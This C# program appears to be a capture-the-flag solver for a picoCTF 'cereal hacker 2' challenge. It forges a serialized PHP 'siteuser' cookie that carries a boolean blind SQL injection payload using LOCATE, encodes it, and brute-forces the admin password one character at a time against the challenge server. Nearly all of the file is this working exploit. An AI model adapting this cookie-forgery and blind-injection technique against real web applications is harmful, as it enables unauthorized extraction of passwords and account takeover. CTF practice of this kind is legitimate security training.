using System;
using System.Net;
using System.Net.Http;
using System.Web;
using System.Collections.Generic;

namespace cereal_hacker_2_solver {
    class Program {

        static char[] valids = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ{|}@_!#$%&()*+,-./:;<=>?[\\]^`~ ".ToCharArray();

        static void Main(string[] args) {
            string adminEndpoint = "https://2019shell1.picoctf.com/problem/62195/index.php?file=admin";
            string password = "";
            Console.WriteLine("hacc in progress");

            var baseAddress = new Uri(adminEndpoint);
            var cookieContainer = new CookieContainer();
            using (var handler = new HttpClientHandler() { CookieContainer = cookieContainer })
            using (var client = new HttpClient(handler) { BaseAddress = new Uri(adminEndpoint) }) {
                for (int i = 1; i < 100; i++) {
                    bool found = false;
                    for (int n = 0; n < valids.Length; n++) {
                        cookieContainer.Add(baseAddress, new Cookie("user_info", UrlEncode(Base64Encode(BuildCookie(valids[n], i)))));
                        var result = client.GetAsync("").Result;
                        if (!result.IsSuccessStatusCode) break;
                        if (result.Content.ReadAsStringAsync().Result.Contains("Flag: ")) {
                            password += valids[n];
                            found = true;
                            break;
                        }
                    }
                    if (!found) {
                        Console.WriteLine("Could not find a new character!");
                        Console.WriteLine("Final Guess: " + password);
                        Console.ReadKey();
                        break;
                    }
                    Console.WriteLine("Progress: " + password);
                    
                }
            }

        }

        public static string BuildCookie(char testChar, int testIndex) {
            string injection = "' or LOCATE(binary '" + testChar + "', password, " + (testIndex) + ") = " + testIndex + " or 'a' = '";
            string cookie = "O:8:\"siteuser\":2:{s:8:\"username\";s:5:\"admin\";s:8:\"password\";s:" + injection.Length + ":\"" + injection +"\";}";
            return cookie;
        }

        public static string Base64Encode(string plainText) {
            var plainTextBytes = System.Text.Encoding.ASCII.GetBytes(plainText);
            return Convert.ToBase64String(plainTextBytes);
        }

        public static string UrlEncode(string plainText) {
            return HttpUtility.UrlEncode(plainText);
        }
    }
}
